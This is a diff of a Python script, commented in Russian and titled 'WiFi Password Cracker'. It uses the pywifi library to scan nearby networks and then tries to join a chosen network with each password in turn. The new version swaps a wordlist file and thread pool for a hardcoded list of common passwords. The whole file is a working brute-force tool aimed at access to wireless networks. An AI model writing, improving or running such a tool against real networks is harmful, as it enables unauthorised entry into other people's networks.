@@ -1,28 +1,25 @@
 import pywifi
-from pywifi import const
 import time
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import os
+from pywifi import const
 
 def scan_networks():
     wifi = pywifi.PyWiFi()
     iface = wifi.interfaces()[0]
-    iface.scan()
-    time.sleep(2)  # Уменьшено время ожидания
-    scan_results = iface.scan_results()
+    iface.scan()  # Сканируем доступные сети
+    time.sleep(2)  # Ждем завершения сканирования
+    results = iface.scan_results()
     networks = []
-
-    for network in scan_results:
-        networks.append(network.ssid)
-
+    
+    for network in results:
+        networks.append(network.ssid)  # Сохраняем названия сетей
     return networks
 
 def test_password(ssid, password):
     wifi = pywifi.PyWiFi()
     iface = wifi.interfaces()[0]
 
-    iface.disconnect()
-    time.sleep(5)  # Увеличено время ожидания для корректного отключения
+    iface.disconnect()  # Отключаемся от текущей сети
+    time.sleep(5)  # Ждем отключения
 
     if iface.status() == const.IFACE_DISCONNECTED:
         profile = pywifi.Profile()
@@ -32,53 +29,48 @@ def test_password(ssid, password):
         profile.cipher = const.CIPHER_TYPE_CCMP
         profile.key = password
 
-        iface.remove_all_network_profiles()
-        tmp_profile = iface.add_network_profile(profile)
+        iface.remove_all_network_profiles()  # Удаляем все профили
+        tmp_profile = iface.add_network_profile(profile)  # Добавляем новый профиль
 
-        iface.connect(tmp_profile)
-        time.sleep(10)  # Увеличено время ожидания для подключения
+        try:
+            iface.connect(tmp_profile)  # Подключаемся к сети
+            time.sleep(1)  # Ждем некоторое время для подключения
 
-        if iface.status() == const.IFACE_CONNECTED:
-            print(f'Success! Password for {ssid} is {password}')
-            iface.disconnect()  # Отключение после успешного подключения
-            os.system("exit")
-            return True
-        else:
-            print(f'Failed to connect to {ssid} with password: {password}')
+            if iface.status() == const.IFACE_CONNECTED:
+                print(f'Success! Password for {ssid} is {password}')
+                iface.disconnect()  # Отключаемся после успешного подключения
+                return True
+            else:
+                print(f'Failed to connect to {ssid} with password: {password}')
+                return False
+        except Exception as e:
+            print(f'Error while trying to connect to {ssid} with password: {password}. Error: {e}')
             return False
     else:
         print(f'Interface status is not disconnected for network {ssid}')
         return False
 
-
 def main():
-    networks = scan_networks()
-
-    if not networks:
-        print("No networks found.")
-        return
-
+    print("Welcome to the WiFi Password Cracker")
+    networks = scan_networks()  # Получаем список доступных сетей
     print("Available networks:")
-    for idx, network in enumerate(networks):
-        print(f"{idx + 1}. {network}")
+    
+    for i, network in enumerate(networks, start=1):
+        print(f"{i}. {network}")
+    
+    choice = int(input("Select a network (enter the number): "))
+    
+    if 1 <= choice <= len(networks):
+        selected_network = networks[choice - 1]
+        print(f"Selected network: {selected_network}")
+        
+        passwords = ['12345', '1234', 'password', 'qwerty', '123456789', 
+                     '24058917', '12345678', '1234567', '111111', '123456']
+        
+        for password in passwords:
+            if test_password(selected_network, password):
+                break  # Выходим, если подключение успешно
 
-    choice = int(input("Select a network (enter the number): ")) - 1
-
-    if 0 <= choice < len(networks):
-        ssid = networks[choice]
-        print(f'Selected network: {ssid}')
-
-        with open('BrutforceWifi/WifiPassword.txt', 'r') as f:
-            passwords = f.readlines()
-
-        # Параллельная проверка паролей
-        with ThreadPoolExecutor(max_workers=10) as executor:
-            futures = [executor.submit(test_password, ssid, password.strip()) for password in passwords]
-            for future in as_completed(futures):
-                result = future.result()
-                if result:
-                    print("Password found!")
-                    break
     else:
         print("Invalid choice. Exiting.")
 
